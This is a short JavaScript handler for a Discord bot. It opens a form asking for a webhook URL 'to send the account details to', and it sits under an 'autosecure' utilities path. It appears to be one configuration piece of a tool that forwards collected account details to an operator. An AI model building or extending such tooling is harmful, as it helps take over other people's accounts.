const { TextInputStyle } = require("discord.js");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");

module.exports = {
  name: "changewebhook",
  userOnly: true,
  callback: async (client, interaction) => {
    const [t, botnumber, ownerid] = interaction.customId.split("|");

    return interaction.showModal(
      modalBuilder(
        `changewebhookmodal|${botnumber}|${ownerid}`,
        `Change webhook`,
        [
          {
            setCustomId: "webhook",
            setMaxLength: 4000,
            setMinLength: 0,
            setRequired: false,
            setLabel: "Discord webhook URL",
            setPlaceholder: "Type the desired webhook to send the account details to.",
            setStyle: TextInputStyle.Short
          }
        ]
      )
    );
  }
};
